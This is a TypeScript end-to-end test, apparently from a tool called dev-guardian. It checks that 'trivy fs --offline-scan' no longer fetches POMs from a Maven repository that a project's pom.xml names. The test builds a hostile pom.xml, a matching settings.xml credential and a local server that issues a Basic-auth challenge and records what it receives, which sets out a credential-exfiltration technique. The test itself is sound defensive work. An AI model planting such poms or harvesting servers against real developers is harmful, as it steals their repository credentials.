/**
 * `trivy fs` over a repository whose `pom.xml` names its own Maven
 * repository, with the real Trivy (gated on it; a skip reports as a skip).
 * The attack `runners/trivyRun.ts` measured on Trivy 0.74.0: the pom's
 * `<repositories>` made Trivy fetch every dependency's POM from a host the
 * repository chose, and when `~/.m2/settings.xml` held a matching
 * `<server>` it sent that credential with each request.
 *
 * A local HTTP server stands in for the attacker's Maven repository and
 * records every request's path and `Authorization`; a temporary HOME holds a
 * settings.xml with a fake credential bound to the repository's id. This
 * asserts the fix: with `--offline-scan` (what every dev-guardian `trivy fs`
 * now passes) Trivy contacts that repository not at all. The before picture
 * — without the flag, Trivy fetched each dependency's POM from it and sent
 * the `~/.m2` credential (Basic) with the request — was measured on Trivy
 * 0.74.0 against the same stand-in and is recorded in
 * `runners/trivyRun.ts`'s module comment; it is not re-run here, because a
 * Trivy allowed to resolve Java online first downloads its Java index DB,
 * which makes the negative control slow and network-bound.
 */

import { execFileSync } from 'node:child_process';
import { createServer } from 'node:http';
import { mkdirSync, writeFileSync } from 'node:fs';
import { join } from 'node:path';
import { afterAll, afterEach, beforeAll, describe, expect, it } from 'vitest';
import { cleanupTempDirs, makeTempDir } from '../helpers/tempDir.js';
import { isInstalled } from '../helpers/toolchain.js';

const TRIVY = await isInstalled('trivy');
const TIMEOUT_MS = 300_000;
const PASSWORD = `m2-${process.pid}-${Date.now()}`;

interface Seen {
  url: string;
  auth: string | undefined;
}
let repo: { port: number; seen: Seen[]; close(): Promise<void> };

beforeAll(async () => {
  const seen: Seen[] = [];
  const server = createServer((req, res) => {
    seen.push({ url: req.url ?? '', auth: req.headers.authorization });
    req.resume();
    // Challenge once so Trivy sends the credential its ~/.m2 binds to this repo's id, then answer a POM.
    if (req.headers.authorization === undefined) {
      res.writeHead(401, { 'www-authenticate': 'Basic realm="maven"' });
      res.end();
      return;
    }
    res.writeHead(200, { 'content-type': 'application/xml' });
    res.end('<project><modelVersion>4.0.0</modelVersion><groupId>x</groupId><artifactId>y</artifactId><version>1.0</version></project>');
  });
  await new Promise<void>((done) => server.listen(0, '127.0.0.1', done));
  const address = server.address();
  repo = {
    port: typeof address === 'object' && address !== null ? address.port : 0,
    seen,
    close: () => new Promise<void>((done) => server.close(() => done())),
  };
});

afterEach(() => {
  if (repo !== undefined) repo.seen.length = 0;
});

afterAll(async () => {
  if (repo !== undefined) await repo.close();
  cleanupTempDirs();
});

/** A project whose pom names the attacker's repository, and a HOME whose settings.xml binds a credential to its id. */
function hostileProject(): { project: string; env: NodeJS.ProcessEnv } {
  const project = makeTempDir('trivy-pom-e2e-');
  writeFileSync(
    join(project, 'pom.xml'),
    '<?xml version="1.0"?><project><modelVersion>4.0.0</modelVersion><groupId>com.victim</groupId><artifactId>app</artifactId><version>1.0</version>' +
      `<repositories><repository><id>evil</id><url>http://127.0.0.1:${repo.port}/maven/</url></repository></repositories>` +
      '<dependencies><dependency><groupId>org.apache.commons</groupId><artifactId>commons-text</artifactId><version>1.9</version></dependency></dependencies></project>',
    'utf8',
  );
  const home = makeTempDir('trivy-pom-e2e-home-');
  mkdirSync(join(home, '.m2'), { recursive: true });
  writeFileSync(
    join(home, '.m2', 'settings.xml'),
    `<settings><servers><server><id>evil</id><username>me</username><password>${PASSWORD}</password></server></servers></settings>`,
    'utf8',
  );
  const env: NodeJS.ProcessEnv = { ...process.env, HOME: home, USERPROFILE: home, TRIVY_SKIP_VERSION_CHECK: 'true', TRIVY_DISABLE_TELEMETRY: 'true' };
  delete env['MAVEN_OPTS'];
  return { project, env };
}

function runTrivyFs(project: string, env: NodeJS.ProcessEnv, extra: string[]): void {
  const work = makeTempDir('trivy-pom-e2e-work-');
  writeFileSync(join(work, 'empty.yaml'), '');
  try {
    // `--scanners license`, so no vulnerability DB download stands between
    // the scan and the pom resolution this test is about.
    execFileSync(
      'trivy',
      ['fs', '--scanners', 'license', ...extra, '--skip-db-update', '--skip-java-db-update', '--config', join(work, 'empty.yaml'), '--cache-dir', join(work, 'cache'), '--format', 'json', '--output', join(work, 'out.json'), '--quiet', project],
      { timeout: TIMEOUT_MS, stdio: 'ignore', env },
    );
  } catch {
    /* an exit code is fine — what the stand-in server received is the assertion */
  }
}

describe('trivy fs and a hostile pom.xml (real Trivy, gated)', () => {
  it.skipIf(!TRIVY)(
    'with --offline-scan (what dev-guardian passes) Trivy contacts the pom\'s repository not at all',
    () => {
      const { project, env } = hostileProject();
      runTrivyFs(project, env, ['--offline-scan']);
      expect(repo.seen).toEqual([]);
    },
    TIMEOUT_MS + 60_000,
  );
});
